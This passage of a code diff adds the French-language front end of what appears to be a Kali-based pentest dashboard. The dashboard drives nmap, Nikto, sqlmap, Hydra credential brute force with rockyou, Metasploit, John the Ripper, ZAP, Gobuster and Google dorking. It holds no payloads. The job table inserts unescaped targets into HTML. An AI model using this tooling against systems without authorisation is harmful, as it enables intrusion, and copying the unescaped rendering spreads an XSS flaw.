+          <a class="dork-open-btn" href="${esc(d.url)}" target="_blank" rel="noopener noreferrer">
+            <i data-lucide="external-link"></i> Ouvrir
+          </a>
+        </div>`).join('')}
+    </div>`;
+  window._lastDorkUrls = dorks.map(d => d.url);
+  if (window.lucide) lucide.createIcons();
+}
+
+function openAllDorkUrls(urls) {
+  const list = urls || window._lastDorkUrls || [];
+  if (!list.length) return;
+  list.forEach((url, i) => {
+    setTimeout(() => window.open(url, '_blank', 'noopener,noreferrer'), i * 400);
+  });
+  showToast(`Ouverture de ${list.length} onglet(s) de recherche… Autorisez les pop-ups si besoin.`, 'success');
+}
+
+function hideDorkResults() {
+  const panel = document.getElementById('dork-results');
+  if (panel) { panel.style.display = 'none'; panel.innerHTML = ''; }
+  window._lastDorkUrls = [];
+}
+
+// ── Génère le bloc presets pour un outil ────────────────────
+function presetBlock(tool, taId, hint, defaultKey) {
+  const items = presets[tool];
+  const def   = defaultKey || Object.keys(items)[0];
+  const chips = Object.entries(items).map(([k, v]) =>
+    `<button type="button" class="chip ${k === def ? 'active' : ''}" data-tool="${tool}" data-key="${k}" onclick="loadPreset('${tool}','${k}','${taId}',this)"><i data-lucide="${v.icon}"></i>${v.name}</button>`
+  ).join('');
+  return `
+    <div class="preset-chips">${chips}</div>
+    <div class="preset-desc" id="${taId}-desc">${items[def].desc}</div>
+    <textarea id="${taId}" rows="3" class="cmd-textarea">${items[def].args}</textarea>
+    <div class="cmd-hint">${hint}</div>`;
+}
+
+function loadPreset(tool, key, taId, btn) {
+  const item = presets[tool][key];
+  if (!item) return;
+  document.getElementById(taId).value = item.args;
+  document.getElementById(taId + '-desc').textContent = item.desc;
+  document.querySelectorAll(`[data-tool="${tool}"]`).forEach(b => b.classList.remove('active'));
+  if (btn) btn.classList.add('active');
+}
+
+// Variante "profil" : uniquement des chips, pas de commande modifiable.
+// La valeur choisie est stockée dans un <input hidden id="opt-{optId}">
+// et transmise telle quelle au backend qui en déduit la vraie commande.
+function profileBlock(tool, optId, defaultKey) {
+  const items = presets[tool];
+  const def   = defaultKey || Object.keys(items)[0];
+  const chips = Object.entries(items).map(([k, v]) =>
+    `<button type="button" class="chip ${k === def ? 'active' : ''}" data-tool="${tool}" data-key="${k}" onclick="loadProfile('${tool}','${k}','${optId}',this)"><i data-lucide="${v.icon}"></i>${v.name}</button>`
+  ).join('');
+  return `
+    <div class="preset-chips">${chips}</div>
+    <div class="preset-desc" id="${optId}-desc">${items[def].desc}</div>
+    <input type="hidden" id="opt-${optId}" value="${def}" />`;
+}
+
+function loadProfile(tool, key, optId, btn) {
+  const item = presets[tool][key];
+  if (!item) return;
+  document.getElementById('opt-' + optId).value = key;
+  document.getElementById(optId + '-desc').textContent = item.desc;
+  document.querySelectorAll(`[data-tool="${tool}"]`).forEach(b => b.classList.remove('active'));
+  if (btn) btn.classList.add('active');
+}
+
+function toggleCmd(id, show) {
+  const el = document.getElementById(id);
+  if (el) el.style.display = show ? 'block' : 'none';
+}
+
+// ── Config modules ──────────────────────────────────────────
+const moduleConfig = {
+  recon: {
+    title: 'Reconnaissance', icon: 'radar',
+    iconBg: 'rgba(59,130,246,.15)', iconColor: '#60a5fa',
+    options: () => `
+      <div class="cmd-block">
+        <div class="cmd-label"><i data-lucide="wrench"></i> Outil — Nmap</div>
+        ${presetBlock('nmap', 'opt-nmap_args', 'Variables : <code>{target}</code> (ajouté automatiquement)', 'standard')}
+      </div>
+      <div class="form-group toggle-row">
+        <label>Activer Whois</label>
+        <label class="toggle"><input type="checkbox" id="opt-whois"><span class="toggle-slider"></span></label>
+      </div>
+
+      <div class="form-group toggle-row">
+        <label>Activer WhatWeb <span class="label-hint">(technologies web)</span></label>
+        <label class="toggle"><input type="checkbox" id="opt-whatweb" onchange="toggleCmd('whatweb-cmd', this.checked)"><span class="toggle-slider"></span></label>
+      </div>
+      <div id="whatweb-cmd" class="cmd-block" style="display:none">
+        <div class="cmd-label"><i data-lucide="layers"></i> WhatWeb — Détection CMS, frameworks, serveur</div>
+        <div class="preset-desc">Cible : domaine ou URL (<code>https://</code> ajouté si absent). Profil d'agressivité :</div>
+        ${profileBlock('whatweb', 'whatweb_profile', 'standard')}
+      </div>`
+  },
+  passive_recon: {
+    title: 'Reconnaissance passive', icon: 'search',
+    iconBg: 'rgba(20,184,166,.15)', iconColor: '#2dd4bf',
+    launchLabel: 'Générer et lancer les dorks',
+    options: () => dorkOptionsHtml(),
+  },
+  scan: {
+    title: 'Scan de Vulnérabilités', icon: 'shield-alert',
+    iconBg: 'rgba(245,158,11,.15)', iconColor: '#fbbf24',
+    options: () => `
+      <div class="form-group">
+        <label>Port(s) spécifique(s) <span class="label-hint">(ex: 80  ou  80,443  ou  1-1000)</span></label>
+        <input type="text" id="opt-port" value="80,443" />
+      </div>
+
+      <div class="form-group toggle-row">
+        <label>Activer Nmap NSE</label>
+        <label class="toggle"><input type="checkbox" id="opt-nmap_vuln" checked onchange="toggleCmd('nmap_vuln-cmd', this.checked)"><span class="toggle-slider"></span></label>
+      </div>
+      <div id="nmap_vuln-cmd" class="cmd-block">
+        <div class="cmd-label"><i data-lucide="crosshair"></i> Nmap NSE — Scripts de détection de vulnérabilités</div>
+        ${profileBlock('nmap_vuln', 'nmap_vuln_profile', 'standard')}
+      </div>
+
+      <div class="form-group toggle-row">
+        <label>Activer Nikto</label>
+        <label class="toggle"><input type="checkbox" id="opt-nikto" checked onchange="toggleCmd('nikto-cmd', this.checked)"><span class="toggle-slider"></span></label>
+      </div>
+      <div id="nikto-cmd" class="cmd-block">
+        <div class="cmd-label"><i data-lucide="bug"></i> Nikto — Scanner de vulnérabilités web</div>
+        ${profileBlock('nikto', 'nikto_profile', 'standard')}
+      </div>
+
+      <div class="form-group toggle-row">
+        <label>Activer SSLyze</label>
+        <label class="toggle"><input type="checkbox" id="opt-sslyze" onchange="toggleCmd('sslyze-cmd', this.checked)"><span class="toggle-slider"></span></label>
+      </div>
+      <div id="sslyze-cmd" class="cmd-block" style="display:none">
+        <div class="cmd-label"><i data-lucide="lock"></i> SSLyze — Audit TLS/SSL</div>
+        ${profileBlock('sslyze', 'sslyze_profile', 'standard')}
+      </div>`
+  },
+  exploit: {
+    title: 'Exploitation', icon: 'zap',
+    iconBg: 'rgba(239,68,68,.15)', iconColor: '#f87171',
+    options: () => `
+      <div class="form-group">
+        <label>Outil d'exploitation</label>
+        <select id="opt-mode" onchange="switchExploitTool(this.value)">
+          <option value="sqlmap">SQLmap — Injection SQL</option>
+          <option value="hydra">Hydra — Brute-force credentials</option>
+          <option value="msf">Metasploit — Framework d'exploitation</option>
+          <option value="john">John the Ripper — Cassage de hashes</option>
+        </select>
+      </div>
+
+      <div id="tool-sqlmap" class="cmd-block">
+        <div class="cmd-label"><i data-lucide="syringe"></i> SQLmap — Injection SQL automatisée</div>
+        ${profileBlock('sqlmap', 'sqlmap_profile', 'standard')}
+      </div>
+
+      <div id="tool-hydra" class="cmd-block" style="display:none">
+        <div class="cmd-label"><i data-lucide="key-round"></i> Hydra — Brute-force credentials multi-protocoles</div>
+
+        <div class="form-group">
+          <label>Service</label>
+          <select id="opt-service">
+            <option value="ssh">SSH (port 22)</option>
+            <option value="ftp">FTP (port 21)</option>
+            <option value="rdp">RDP (port 3389)</option>
+            <option value="smb">SMB (port 445)</option>
+            <option value="mysql">MySQL (port 3306)</option>
+            <option value="vnc">VNC (port 5900)</option>
+            <option value="telnet">Telnet (port 23)</option>
+            <option value="http-post-form">HTTP form POST</option>
+            <option value="http-get">HTTP Basic Auth</option>
+          </select>
+        </div>
+
+        <div class="form-group">
+          <label>Port <span class="label-hint">(optionnel, par défaut le port du service)</span></label>
+          <input type="text" id="opt-port" placeholder="ex: 2222" />
+        </div>
+
+        ${wlPickerHtml('hydra_users', 'Utilisateurs', 'users', false)}
+        ${wlPickerHtml('hydra_pass',  'Mots de passe', 'key-round', true)}
+
+        <div class="form-group">
+          <label>Threads <span class="label-hint">(Hydra -t, défaut 4)</span></label>
+          <input type="number" id="opt-threads" min="1" max="64" value="4" />
+        </div>
+      </div>
+
+      <div id="tool-msf" class="cmd-block" style="display:none">
+        <div class="cmd-label"><i data-lucide="bomb"></i> Metasploit Framework</div>
+        ${profileBlock('msf', 'msf_profile', 'handler')}
+      </div>
+
+      <div id="tool-john" class="cmd-block" style="display:none">
+        <div class="cmd-label"><i data-lucide="key"></i> John the Ripper — Cassage hors ligne de hashes</div>
+        <div class="preset-desc">
+          <b>Cible</b> = hash brut (ex: <code>$1$abc$xyz…</code>) ou chemin de fichier de hashes dans <code>/tmp</code>.
+        </div>
+        <div class="form-group" style="margin-top:12px">
+          <label>Format de hash <span class="label-hint">(vide = auto-détection)</span></label>
+          <input type="text" id="opt-format" placeholder="ex: raw-md5, sha512crypt, NT, bcrypt…" />
+        </div>
+
+        ${wlPickerHtml('john_wordlist', 'Wordlist', 'book-open', true)}
+
+        <div class="form-group toggle-row">
+          <label>Activer les règles de mutation (--rules)</label>
+          <label class="toggle"><input type="checkbox" id="opt-rules"><span class="toggle-slider"></span></label>
+        </div>
+      </div>`
+  },
+  web_scan: {
+    title: 'Scan Web / API', icon: 'globe',
+    iconBg: 'rgba(139,92,246,.15)', iconColor: '#a78bfa',
+    options: () => `
+      <div class="form-group">
+        <label>Type de scan ZAP</label>
+        <select id="opt-scan_type" onchange="switchZapMode(this.value)">
+          <option value="spider">Spider — Crawl passif</option>
+          <option value="active">Active scan — Tests actifs</option>
+        </select>
+      </div>
+
+      <div id="zap-spider" class="cmd-block">
+        <div class="cmd-label"><i data-lucide="bug"></i> ZAP Spider — Découverte d'URLs et endpoints</div>
+        ${profileBlock('zap_spider', 'zap_spider_profile', 'standard')}
+      </div>
+
+      <div id="zap-active" class="cmd-block" style="display:none">
+        <div class="cmd-label"><i data-lucide="zap"></i> ZAP Active Scan — Tests d'attaque actifs</div>
+        ${profileBlock('zap_active', 'zap_active_profile', 'owasp')}
+      </div>
+
+      <div class="form-group">
+        <label>URL du proxy ZAP <span class="label-hint">(laisser vide → utilise http://zap:8080 du compose)</span></label>
+        <input type="text" id="opt-zap_url" placeholder="http://zap:8080 (defaut)" />
+      </div>
+
+      <div class="form-group toggle-row">
+        <label>Activer Gobuster <span class="label-hint">(pages / répertoires cachés)</span></label>
+        <label class="toggle"><input type="checkbox" id="opt-gobuster" onchange="toggleCmd('gobuster-cmd', this.checked)"><span class="toggle-slider"></span></label>
+      </div>
+      <div id="gobuster-cmd" class="cmd-block" style="display:none">
+        <div class="cmd-label"><i data-lucide="folder-search"></i> Gobuster — Brute-force de chemins HTTP</div>
+        <div class="preset-desc">Cible : URL complète ou domaine (<code>https://</code> par défaut).</div>
+        ${profileBlock('gobuster', 'gobuster_profile', 'standard')}
+        <div class="form-group" style="margin-top:12px">
+          <label>Extensions <span class="label-hint">(optionnel, ex: php,html,txt)</span></label>
+          <input type="text" id="opt-gobuster_extensions" placeholder="php,html,txt,bak" />
+        </div>
+      </div>`
+  },
+};
+
+function switchExploitTool(tool) {
+  ['sqlmap', 'hydra', 'msf', 'john'].forEach(t => {
+    const el = document.getElementById('tool-' + t);
+    if (el) el.style.display = (t === tool) ? 'block' : 'none';
+  });
+  const targetInput = document.getElementById('target');
+  if (targetInput) {
+    if (tool === 'john') {
+      targetInput.placeholder = 'hash brut ($1$…, $6$…, NTLM, md5…) ou chemin /tmp/hashes.txt';
+    } else {
+      targetInput.placeholder = 'ex: 192.168.1.1 ou example.com';
+    }
+    validateTarget();
+  }
+}
+
+function switchZapMode(mode) {
+  document.getElementById('zap-spider').style.display = (mode === 'spider') ? 'block' : 'none';
+  document.getElementById('zap-active').style.display = (mode === 'active') ? 'block' : 'none';
+}
+
+// ── Wordlist picker : upload / manuel / rockyou ─────────────
+// Chaque "slot" représente un champ (users Hydra, pass Hydra, wordlist John).
+const wlState = {
+  hydra_users:   { source: 'inline',  file: null, filename: null, inline: '', lines: 0 },
+  hydra_pass:    { source: 'rockyou', file: null, filename: null, inline: '', lines: 0 },
+  john_wordlist: { source: 'rockyou', file: null, filename: null, inline: '', lines: 0 },
+};
+let wlCurrentSlot = null;
+
+function wlPickerHtml(slot, label, icon, withRockyou) {
+  const rockyouBtn = withRockyou
+    ? `<button type="button" class="chip" data-slot="${slot}" data-source="rockyou" onclick="selectSource('${slot}','rockyou')">
+         <i data-lucide="key-square"></i> rockyou.txt (Kali)
+       </button>`
+    : '';
+  return `
+    <div class="wl-picker" data-wl-slot="${slot}">
+      <div class="wl-picker-label"><i data-lucide="${icon}"></i> ${label}</div>
+      <div class="wl-tabs">
+        <button type="button" class="chip" data-slot="${slot}" data-source="file" onclick="document.getElementById('wl-${slot}-file').click()">
+          <i data-lucide="upload"></i> Importer un fichier
+        </button>
+        <button type="button" class="chip" data-slot="${slot}" data-source="inline" onclick="openWordlistModal('${slot}','${label}')">
+          <i data-lucide="list"></i> Liste manuelle
+        </button>
+        ${rockyouBtn}
+        <input type="file" id="wl-${slot}-file" accept=".txt,.lst,.list,text/plain" style="display:none" onchange="uploadWordlist(this,'${slot}')" />
+      </div>
+      <div class="wl-summary wl-empty" id="wl-${slot}-summary">Aucune source sélectionnée</div>
+    </div>`;
+}
+
+function selectSource(slot, source) {
+  if (!wlState[slot]) return;
+  wlState[slot].source = source;
+  if (source === 'rockyou') {
+    wlState[slot].file = null;
+    wlState[slot].filename = null;
+    wlState[slot].inline = '';
+    wlState[slot].lines = 0;
+  }
+  renderSlot(slot);
+}
+
+function renderSlot(slot) {
+  const s = wlState[slot];
+  if (!s) return;
+  // Chips actives
+  document.querySelectorAll(`[data-slot="${slot}"][data-source]`).forEach(b => {
+    b.classList.toggle('active', b.dataset.source === s.source);
+  });
+  const summary = document.getElementById(`wl-${slot}-summary`);
+  if (!summary) return;
+  summary.classList.remove('wl-empty');
+  if (s.source === 'rockyou') {
+    summary.innerHTML = '<i data-lucide="key-square"></i> <b>rockyou.txt</b> — Kali par défaut (~14M entrées)';
+  } else if (s.source === 'file' && s.filename) {
+    summary.innerHTML = `<i data-lucide="file-text"></i> <b>${s.filename}</b> — ${s.lines.toLocaleString('fr-FR')} ligne(s)`;
+  } else if (s.source === 'inline' && s.lines > 0) {
+    summary.innerHTML = `<i data-lucide="list"></i> Liste manuelle — ${s.lines} entrée(s)`;
+  } else {
+    summary.classList.add('wl-empty');
+    summary.innerHTML = '<i data-lucide="alert-circle"></i> Aucune source sélectionnée';
+  }
+  if (window.lucide) lucide.createIcons();
+}
+
+function renderAllSlots() {
+  Object.keys(wlState).forEach(renderSlot);
+}
+
+function openWordlistModal(slot, label) {
+  wlCurrentSlot = slot;
+  document.getElementById('wl-modal-title').textContent = `Liste manuelle — ${label}`;
+  const ta = document.getElementById('wl-modal-textarea');
+  ta.value = wlState[slot] ? wlState[slot].inline || '' : '';
+  updateWlModalCount();
+  document.getElementById('wl-modal').classList.add('open');
+  setTimeout(() => ta.focus(), 50);
+}
+
+function closeWordlistModal() {
+  document.getElementById('wl-modal').classList.remove('open');
+  wlCurrentSlot = null;
+}
+
+function saveWordlistModal() {
+  if (!wlCurrentSlot) return closeWordlistModal();
+  const text  = document.getElementById('wl-modal-textarea').value;
+  const lines = text.split('\n').map(l => l.trim()).filter(Boolean);
+  wlState[wlCurrentSlot].source = 'inline';
+  wlState[wlCurrentSlot].inline = lines.join('\n');
+  wlState[wlCurrentSlot].lines  = lines.length;
+  wlState[wlCurrentSlot].file = null;
+  wlState[wlCurrentSlot].filename = null;
+  renderSlot(wlCurrentSlot);
+  closeWordlistModal();
+}
+
+function updateWlModalCount() {
+  const v = document.getElementById('wl-modal-textarea').value;
+  const n = v.split('\n').map(l => l.trim()).filter(Boolean).length;
+  document.getElementById('wl-modal-count').textContent = `${n} entrée(s)`;
+}
+
+async function uploadWordlist(input, slot) {
+  const file = input.files && input.files[0];
+  if (!file) return;
+  const summary = document.getElementById(`wl-${slot}-summary`);
+  if (summary) {
+    summary.classList.remove('wl-empty');
+    summary.innerHTML = '<i data-lucide="loader-2"></i> Envoi en cours…';
+    if (window.lucide) lucide.createIcons();
+  }
+  try {
+    const fd = new FormData();
+    fd.append('file', file);
+    const res = await fetch('/api/modules/wordlist', {
+      method: 'POST', body: fd, credentials: 'same-origin',
+    });
+    if (!res.ok) {
+      const err = await res.json().catch(() => ({}));
+      throw new Error(err.detail || `HTTP ${res.status}`);
+    }
+    const data = await res.json();
+    wlState[slot].source = 'file';
+    wlState[slot].file = data.path;
+    wlState[slot].filename = data.filename;
+    wlState[slot].lines = data.lines;
+    wlState[slot].inline = '';
+    renderSlot(slot);
+  } catch (e) {
+    if (summary) {
+      summary.classList.add('wl-empty');
+      summary.innerHTML = `<i data-lucide="alert-circle"></i> Upload échoué : ${e.message}`;
+      if (window.lucide) lucide.createIcons();
+    }
+  } finally {
+    input.value = '';
+  }
+}
+
+// Wrapper global pour les inputs du textarea — écouté via delegation
+document.addEventListener('input', (e) => {
+  if (e.target && e.target.id === 'wl-modal-textarea') updateWlModalCount();
+});
+document.addEventListener('keydown', (e) => {
+  if (e.key === 'Escape' && document.getElementById('wl-modal').classList.contains('open')) {
+    closeWordlistModal();
+  }
+});
+
+let currentModule = 'passive_recon';
+let currentJobId  = null;
+let currentTarget = '';
+let pollTimer     = null;
+
+// Init
+const qm = new URLSearchParams(location.search).get('m');
+selectModule(qm && moduleConfig[qm] ? qm : 'passive_recon',
+             document.querySelector(`[data-module="${qm || 'passive_recon'}"]`));
+loadJobs();
+if (window.lucide) lucide.createIcons();
+
+// ── Sélection module ────────────────────────────────────────
+function selectModule(name, el) {
+  currentModule = name;
+  document.querySelectorAll('.module-card').forEach(c => c.classList.remove('active'));
+  if (el) el.classList.add('active');
+  const cfg = moduleConfig[name];
+  document.getElementById('form-title').textContent = cfg.title;
+  document.getElementById('form-badge').textContent = name;
+  document.getElementById('module-options').innerHTML =
+    typeof cfg.options === 'function' ? cfg.options() : cfg.options;
+  const targetInput = document.getElementById('target');
+  const launchTxt = document.getElementById('launch-text');
+  if (targetInput) {
+    if (name === 'passive_recon') {
+      targetInput.placeholder = 'ex: example.com ou entreprise-cible.fr';
+    } else if (name === 'exploit' && document.getElementById('opt-mode')?.value === 'john') {
+      targetInput.placeholder = 'hash brut ($1$…) ou chemin /tmp/hashes.txt';
+    } else {
+      targetInput.placeholder = 'ex: 192.168.1.1 ou example.com';
+    }
+  }
+  if (launchTxt) {
+    const label = cfg.launchLabel || 'Lancer le scan';
+    launchTxt.innerHTML = `<i data-lucide="rocket"></i> ${label}`;
+  }
+  hideDorkResults();
+  if (name === 'passive_recon') bindDorkControls();
+  if (window.lucide) lucide.createIcons();
+  renderAllSlots();
+  validateTarget();
+}
+
+function collectOptions() {
+  const opts = {};
+  document.querySelectorAll('#module-options input, #module-options select, #module-options textarea').forEach(el => {
+    // Les inputs techniques du picker (type=file) sont ignorés
+    if (el.type === 'file') return;
+    const key = el.id.replace('opt-', '');
+    if (!el.id || !el.id.startsWith('opt-')) return;
+    if (el.type === 'checkbox') opts[key] = el.checked;
+    else if (el.value !== '') opts[key] = el.value.trim();
+  });
+
+  // Sérialisation des pickers de wordlists en fonction du mode exploit actif
+  const mode = opts.mode;
+  if (currentModule === 'exploit' && mode === 'hydra') {
+    applyWlSlot(opts, 'hydra_users', 'user_file',  'users_inline',     null);
+    applyWlSlot(opts, 'hydra_pass',  'pass_file',  'passwords_inline', 'use_rockyou');
+  }
+  if (currentModule === 'exploit' && mode === 'john') {
+    applyWlSlot(opts, 'john_wordlist', 'wordlist_file', 'wordlist_inline', 'use_rockyou');
+  }
+  if (currentModule === 'passive_recon') {
+    opts.dorks = getSelectedDorkIds();
+    const custom = getCustomDorkLines();
+    if (custom.length) opts.custom_dorks = custom;
+  }
+  return opts;
+}
+
+function applyWlSlot(opts, slot, fileKey, inlineKey, rockyouKey) {
+  const s = wlState[slot];
+  if (!s) return;
+  if (s.source === 'file' && s.file) {
+    opts[fileKey] = s.file;
+  } else if (s.source === 'inline' && s.inline) {
+    opts[inlineKey] = s.inline;
+  } else if (s.source === 'rockyou' && rockyouKey) {
+    opts[rockyouKey] = true;
+  }
+}
+
+// ── Validation cible ────────────────────────────────────────
+const RE_IPV4     = /^(\d{1,3}\.){3}\d{1,3}(\/\d{1,2})?$/;
+const RE_IPV6     = /^([0-9a-fA-F]{0,4}:){2,7}[0-9a-fA-F]{0,4}$/;
+const RE_DOMAIN   = /^([a-zA-Z0-9]([a-zA-Z0-9-]{0,61}[a-zA-Z0-9])?\.)+[a-zA-Z]{2,}$/;
+const RE_URL      = /^https?:\/\/.+/;
+const RE_CIDR     = /^(\d{1,3}\.){3}\d{1,3}\/\d{1,2}$/;
+
+function isValidTarget(val) {
+  if (!val) return { valid: false, msg: 'Veuillez entrer une cible.' };
+  val = val.trim();
+
+  // URL valide (pour SQLmap, ZAP, etc.)
+  if (RE_URL.test(val)) return { valid: true };
+
+  // IPv4
+  if (RE_IPV4.test(val)) {
+    const parts = val.split('/')[0].split('.');
+    const ok = parts.every(p => parseInt(p) >= 0 && parseInt(p) <= 255);
+    if (!ok) return { valid: false, msg: 'Adresse IP invalide. Chaque octet doit etre entre 0 et 255.' };
+    return { valid: true };
+  }
+
+  // IPv6
+  if (RE_IPV6.test(val)) return { valid: true };
+
+  // Domaine
+  if (RE_DOMAIN.test(val)) return { valid: true };
+
+  // Sinon invalide
+  return {
+    valid: false,
+    msg: 'Format invalide. Entrez une adresse IP (ex: 192.168.1.1), un domaine (ex: example.com) ou une URL (ex: http://site.com).'
+  };
+}
+
+function validateTarget() {
+  const input   = document.getElementById('target');
+  const errDiv  = document.getElementById('target-error');
+  const errMsg  = document.getElementById('target-error-msg');
+  const val     = input.value.trim();
+
+  if (!val) {
+    errDiv.style.display = 'none';
+    input.classList.remove('input-invalid', 'input-valid');
+    return true;
+  }
+
+  // John the Ripper : la cible est un hash, pas une IP/URL — on ne valide pas.
+  // Hydra : la cible peut être un hostname interne (ex: 'target', 'db' dans Docker) — on ne valide pas.
+  const modeEl = document.getElementById('opt-mode');
+  if (currentModule === 'exploit' && modeEl && (modeEl.value === 'john' || modeEl.value === 'hydra')) {
+    errDiv.style.display = 'none';
+    input.classList.remove('input-invalid');
+    input.classList.add('input-valid');
+    return true;
+  }
+
+  // Reconnaissance passive (dorks) : champ libre — peut être une marque, un nom, etc.
+  if (currentModule === 'passive_recon') {
+    errDiv.style.display = 'none';
+    input.classList.remove('input-invalid');
+    input.classList.add('input-valid');
+    return true;
+  }
+
+  const check = isValidTarget(val);
+  if (!check.valid) {
+    errDiv.style.display = 'flex';
+    errMsg.textContent   = check.msg;
+    input.classList.add('input-invalid');
+    input.classList.remove('input-valid');
+    if (window.lucide) lucide.createIcons();
+    return false;
+  }
+
+  errDiv.style.display = 'none';
+  input.classList.remove('input-invalid');
+  input.classList.add('input-valid');
+  return true;
+}
+
+// ── Lancement ───────────────────────────────────────────────
+async function launchScan(e) {
+  e.preventDefault();
+  const target = document.getElementById('target').value.trim();
+  if (!target) return;
+
+  if (currentModule === 'passive_recon' && !hasPassiveReconQueries()) {
+    showToast('Sélectionnez au moins un dork prédéfini ou saisissez une requête personnalisée.', 'error');
+    return;
+  }
+
+  // Validation visuelle (warning mais on laisse passer pour créer l'erreur côté serveur)
+  const targetValid = validateTarget();
+  currentTarget = target;
+
+  const btn     = document.getElementById('btn-launch');
+  const spinner = document.getElementById('launch-spinner');
+  const txt     = document.getElementById('launch-text');
+  btn.disabled = true;
+  spinner.style.display = 'inline-block';
+  txt.textContent = 'Lancement…';
+
+  try {
+    const job = await apiFetch('/api/modules/launch', {
+      method: 'POST',
+      body: JSON.stringify({ module: currentModule, target, options: collectOptions() }),
+    });
+
+    currentJobId = job.id;
+    showProgress(job.id, currentModule, target);
+    await loadJobs();
+  } catch (err) {
+    alert('Erreur : ' + err.message);
+    btn.disabled = false;
+    spinner.style.display = 'none';
+    const cfg = moduleConfig[currentModule] || {};
+    txt.innerHTML = `<i data-lucide="rocket"></i> ${cfg.launchLabel || 'Lancer le scan'}`;
+    if (window.lucide) lucide.createIcons();
+  }
+}
+
+// ── Affichage progression ───────────────────────────────────
+function showProgress(jobId, module, target) {
+  currentTarget = target;
+  hideDorkResults();
+  const cfg = moduleConfig[module] || { title: module, icon: 'wrench', iconBg: 'rgba(255,255,255,.1)', iconColor: '#94a3b8' };
+  const iconEl = document.getElementById('prog-icon');
+  iconEl.innerHTML            = `<i data-lucide="${cfg.icon}" class="icon-lg"></i>`;
+  iconEl.style.background     = cfg.iconBg;
+  iconEl.style.color          = cfg.iconColor;
+  document.getElementById('prog-title').textContent  = cfg.title + ' en cours';
+  document.getElementById('prog-target').innerHTML   = `<i data-lucide="target" class="icon-sm"></i> ${target}`;
+  document.getElementById('term-title').textContent  = `bash — toolboxv8@kali — ${module}`;
+  renderTerminal([], 'pending', module, target);
+  setProgressUI(0, 'En attente du worker Celery...', 'pending', []);
+  document.getElementById('progress-panel').style.display = 'block';
+  document.getElementById('prog-actions').style.display   = 'none';
+  if (window.lucide) lucide.createIcons();
+  startPolling(jobId);
+}
+
+function esc(s) {
+  return String(s).replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;');
+}
+
+function renderTerminal(logs, status, module, target) {
+  const body = document.getElementById('term-body');
+  let html = `<div class="term-line">
+    <span class="term-prompt">toolboxv8@kali:~$</span>
+    <span class="term-cmd"> run_${esc(module)} --target ${esc(target)}</span>
+  </div>`;
+
+  if (!logs || logs.length === 0) {
+    html += `<div class="term-line"><span class="term-wait">Connexion au worker Celery<span class="term-cursor">...</span></span></div>`;
+  } else {
+    logs.forEach((l, i) => {
+      const isLast  = i === logs.length - 1;
+      const isErr   = /erreur|error|échec|failed/i.test(l.msg);
+      const isOk    = /terminé|succès|success/i.test(l.msg);
+      const cls     = isErr ? 'term-error' : (isOk && isLast ? 'term-success' : 'term-info');
+      const cursor  = (isLast && status !== 'done' && status !== 'error')
+                      ? '<span class="term-cursor"> █</span>' : '';
+      html += `<div class="term-line">
+        <span class="term-ts">[${esc(l.time)}]</span>
+        <span class="${cls}">${esc(l.msg)}${cursor}</span>
+      </div>`;
+    });
+  }
+
+  if (status === 'done') {
+    html += `<div class="term-line" style="margin-top:4px">
+      <span class="term-success">✔ Mission accomplie — résultats disponibles.</span>
+    </div>
+    <div class="term-line">
+      <span class="term-prompt">toolboxv8@kali:~$</span>
+      <span class="term-cursor"> █</span>
+    </div>`;
+  } else if (status === 'error') {
+    html += `<div class="term-line" style="margin-top:4px">
+      <span class="term-error">✘ Erreur critique — vérifier la configuration.</span>
+    </div>`;
+  }
+
+  body.innerHTML = html;
+  body.scrollTop = body.scrollHeight;
+}
+
+function setProgressUI(pct, step, status, logs) {
+  const bar   = document.getElementById('prog-bar');
+  const pctEl = document.getElementById('prog-pct');
+  const stepEl= document.getElementById('prog-step');
+  const dot   = document.getElementById('step-dot');
+  const badge = document.getElementById('prog-status-badge');
+
+  bar.style.width   = pct + '%';
+  pctEl.textContent = pct + '%';
+  stepEl.textContent= step;
+
+  bar.className   = 'progress-bar-fill' + (status === 'done' ? ' done' : status === 'error' ? ' error' : '');
+  dot.className   = 'step-dot'          + (status === 'done' ? ' done' : status === 'error' ? ' error' : '');
+  badge.textContent  = status;
+  badge.className    = `progress-status progress-status--${status}`;
+
+  renderTerminal(logs, status, currentModule, currentTarget);
+}
+
+// ── Polling ─────────────────────────────────────────────────
+function startPolling(jobId) {
+  if (pollTimer) clearInterval(pollTimer);
+  pollTimer = setInterval(() => pollJob(jobId), 1500);
+}
+
+async function pollJob(jobId) {
+  const data = await apiFetch(`/api/modules/jobs/${jobId}`);
+  if (!data) return;
+
+  const { job, progress } = data;
+  const pct   = progress?.percent ?? 0;
+  const step  = progress?.step    ?? 'En cours...';
+  const logs  = progress?.logs    ?? [];
+  const status = job.status;
+
+  setProgressUI(pct, step, status, logs);
+
+  if (status === 'done' || status === 'error') {
+    clearInterval(pollTimer);
+    pollTimer = null;
+    document.getElementById('prog-actions').style.display = 'flex';
+
+    if (status === 'done' && job.module === 'passive_recon') {
+      const data = job.result?.data || job.result;
+      const dorks = data?.dorks;
+      if (dorks?.length) {
+        renderDorkResults(dorks, data.engine_label, data.domain || job.target);
+        const opts = job.options || {};
+        if (opts.auto_open !== false) {
+          setTimeout(() => openAllDorkUrls(dorks.map(d => d.url)), 600);
+        }
+      }
+    }
+
+    const btn = document.getElementById('btn-launch');
+    const spinner = document.getElementById('launch-spinner');
+    const txt = document.getElementById('launch-text');
+    const cfg = moduleConfig[currentModule] || {};
+    btn.disabled = false;
+    spinner.style.display = 'none';
+    txt.innerHTML = `<i data-lucide="rocket"></i> ${cfg.launchLabel || 'Lancer le scan'}`;
+    if (window.lucide) lucide.createIcons();
+
+    await loadJobs();
+  }
+}
+
+function resetProgress() {
+  if (pollTimer) clearInterval(pollTimer);
+  document.getElementById('progress-panel').style.display = 'none';
+  hideDorkResults();
+  currentJobId = null;
+}
+
+// ── Historique jobs ─────────────────────────────────────────
+async function loadJobs() {
+  const jobs = await apiFetch('/api/modules/jobs');
+  const tbody = document.getElementById('jobs-body');
+  if (!jobs || jobs.length === 0) {
+    tbody.innerHTML = '<tr><td colspan="6" class="table-empty">Aucun job</td></tr>';
+    return;
+  }
+  tbody.innerHTML = jobs.map(j => `
+    <tr>
+      <td class="td-id">#${j.id}</td>
+      <td><span class="badge badge--module">${j.module}</span></td>
+      <td class="td-target">${j.target}</td>
+      <td><span class="status status--${j.status}">${j.status}</span></td>
+      <td class="td-date">${formatDate(j.created_at)}</td>
+      <td style="display:flex;gap:6px;flex-wrap:wrap">
+        <button class="btn-sm" onclick="resumeProgress(${j.id},'${j.module}','${j.target}')"><i data-lucide="eye"></i> Voir</button>
